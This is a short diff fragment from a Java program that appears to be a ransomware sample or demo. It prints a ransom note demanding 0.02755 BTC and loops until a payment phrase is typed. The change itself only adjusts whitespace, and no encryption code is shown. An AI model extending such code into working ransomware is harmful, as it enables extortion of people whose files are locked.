@@ -110,7 +110,7 @@ public class Application {
 
         System.out.println("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted");
 
-        do{
+        do {
             input = scanner.next();
             System.out.println(input);
         } while(!input.contains("exchange 0.02755BTC"));
